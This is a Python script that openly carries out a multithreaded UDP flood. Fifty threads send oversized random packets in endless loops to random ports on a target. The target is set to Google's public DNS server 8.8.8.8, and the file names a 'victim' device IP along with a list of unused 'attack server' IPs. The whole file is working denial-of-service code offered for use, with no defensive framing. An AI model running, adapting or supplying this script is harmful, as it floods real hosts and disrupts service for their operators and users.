import threading
import random
import socket
import signal
import sys
import speedtest
import time

# Global variables
carrier_ips = ["27.61.154.148"]  # Victim's device IP
# Expanded list of attack servers
attack_servers = [
    "149.202.182.136", "185.54.175.156", "62.76.249.38", "192.168.1.1",
    "198.51.100.1", "203.0.113.1", "94.142.241.111", "195.54.160.149",
    "185.232.21.124", "103.145.12.34", "185.81.180.1", "31.13.71.36",
    "52.58.78.16", "54.85.117.166", "8.8.4.4", "9.9.9.9"
]
targets = ["8.8.8.8"]  # Google's public DNS, for testing
threads = 50  # Number of attack threads for concurrent flooding

# Function to handle graceful shutdown when the script is interrupted
def signal_handler(sig, frame):
    print("\nAttack stopped. Gracefully shutting down.")
    sys.exit(0)

# Register signal handler to catch interruption (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Function to test internet speed
def get_speed():
    try:
        st = speedtest.Speedtest()
        st.get_best_server()  # Finds the best server
        download_speed = st.download() / 1_000_000  # Mbps
        upload_speed = st.upload() / 1_000_000  # Mbps
        return download_speed, upload_speed
    except Exception as e:
        print(f"Error testing speed: {e}")
        return 0, 0  # Return 0 Mbps if speed test fails

# Function to perform the flooding attack
def flood_attack(target, port, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)  # Random payload
    while True:
        try:
            sock.sendto(packet, (target, port))
            print(f"Packet sent to {target}:{port}")
        except Exception as e:
            print(f"Error sending packet to {target}:{port}: {e}")
            break  # Exit thread on error

# Threaded attack function
def start_attack():
    try:
        # Get initial speed before the attack
        print("Checking speed before the attack...")
        initial_download, initial_upload = get_speed()
        print(f"Initial Speed - Download: {initial_download:.2f} Mbps, Upload: {initial_upload:.2f} Mbps")

        print("\nStarting advanced attack... Press Ctrl+C to stop.")

        # Launch multiple threads for the attack
        for i in range(threads):
            target_ip = random.choice(targets)
            target_port = random.randint(1, 65535)  # Random port
            packet_size = random.randint(1024, 65507)  # Random packet size
            thread = threading.Thread(target=flood_attack, args=(target_ip, target_port, packet_size))
            thread.daemon = True  # Automatically exit threads on main thread exit
            thread.start()

        # Keep the script running to sustain the attack
        while True:
            print("\nAttack in progress... Measure your speed now.")
            time.sleep(10)  # Log progress every 10 seconds

    except Exception as e:
        print(f"Error in attack loop: {e}")
        sys.exit(1)  # Exit if the main attack loop encounters a critical error

# Run the attack and handle errors gracefully
if __name__ == "__main__":
    start_attack()
    
